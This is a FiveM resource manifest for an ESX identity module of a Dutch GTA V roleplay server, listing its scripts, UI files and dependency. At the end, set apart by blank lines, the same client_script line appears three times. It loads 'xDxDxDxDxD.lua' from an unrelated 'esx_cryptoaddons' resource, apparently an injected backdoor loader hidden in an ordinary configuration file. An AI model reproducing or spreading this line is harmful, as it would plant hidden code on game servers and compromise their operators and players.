--[[ 
	Kronenburg Roleplay
	Copyright © GJSBRT <g@gijs.eu>

	This project is licensed under the terms of the Apache License 2.0 license.
	https://choosealicense.com/licenses/apache-2.0/
]]
 
 
fx_version 'adamant'

game 'gta5'

description 'ESX Identity'

version '1.2.0'

server_scripts {
	'@es_extended/locale.lua',
	'@mysql-async/lib/MySQL.lua',
	'locales/nl.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/nl.lua',
	'config.lua',
	'client/main.lua'
}

ui_page 'html/index.html'

files {
	'html/index.html',
	'html/script.js',
	'html/style.css'
}

dependency 'es_extended'




client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'

client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'

client_script '@esx_cryptoaddons/xDxDxDxDxD.lua'